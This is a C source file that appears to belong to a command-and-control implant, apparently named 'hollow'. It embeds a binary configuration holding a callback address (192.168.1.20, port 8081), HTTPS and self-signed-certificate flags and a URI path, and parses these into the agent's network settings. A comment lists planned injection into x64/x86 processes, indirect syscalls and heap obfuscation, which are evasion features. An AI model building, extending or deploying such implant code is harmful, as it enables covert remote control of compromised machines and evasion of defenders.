#include "../../includes/core/core.h"
#include "../../includes/byte/byte.h"
#include "../../includes/utils/utils.h"



PBYTE GetConfig() {
	return (PBYTE)"\x01\x00\x00\x00\x0d\x00\x00\x00\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x30\x00\x91\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x2f\x74\x65\x73\x74\x00\x01\x00\x00\x00\x00";
}

INT32 GetConfigSize() {
	return 52;
}


/*
  comms
	[Total-Callbacks] 4 bytes
	[for each callbacks]
		[callbacks len] 4 Bytes
		[callbacks str] N Bytes
		[Port]          4 Bytes
		[IsHttps]       4 Bytes
	    [IsSelfSigned]  4 Bytes

	[Total URIS] 4 Bytes
	[For each URI]
		[URI len] 4 Bytes
		[URI Str] N bytes
	[Headers-len] 4 Bytes
	[Headers-Str] N Bytes
------ below isnt supported yet
  inject
	[inject-to-x64 len] 4 bytes
	[inject-to-x64 str] N bytes
	[inject-to-x86 len] 4 bytes
	[inject-to-x86 str] N bytes
  opsec
    [use-indirect-syscalls] 4 bytes
	[use-heap-obf]          4 Bytes
	to add later

*/

BOOL ParseConfig() {

	if (!packager->NewParser(GetConfig(), GetConfigSize()))
		return FALSE;

	hollow->config->net.TotalCallbacks = packager->Parse4();
	for (int i = 0; i < hollow->config->net.TotalCallbacks; i++) {
		INT32 DomainLen = packager->Parse4();
		PCHAR temp = (PCHAR)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, DomainLen);
		packager->ParseBytes(temp, DomainLen);
		MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, temp, DomainLen, hollow->config->net.hosts[i].host, (int)(sizeof(hollow->config->net.hosts[i].host) / sizeof(WCHAR)));
		hollow->config->net.hosts[i].port            = packager->Parse4();
		hollow->config->net.hosts[i].isHttps         = packager->Parse4();
		hollow->config->net.hosts[i].TrustSelfSigned = packager->Parse4();
		hollow->Win32.LocalFree(temp);
	}

	hollow->config->net.TotalURIs = packager->Parse4();
	for (int i = 0; i < hollow->config->net.TotalURIs; i++) {
		INT32 len = packager->Parse4();
		PCHAR temp = (PCHAR)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, len);
		packager->ParseBytes(temp, len);
		MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, temp, len, hollow->config->net.paths[i].Path, (int)(sizeof(hollow->config->net.paths[i].Path) / sizeof(WCHAR)));
		hollow->Win32.LocalFree(temp);
	}

	INT32 HeadersLen = packager->Parse4();
	PCHAR temp = (PCHAR)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, HeadersLen);
	packager->ParseBytes(temp, HeadersLen);
	MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, temp, HeadersLen, hollow->config->net.Headers, (int)(sizeof(hollow->config->net.Headers) / sizeof(WCHAR)));
	hollow->Win32.LocalFree(temp);

	return TRUE;
}
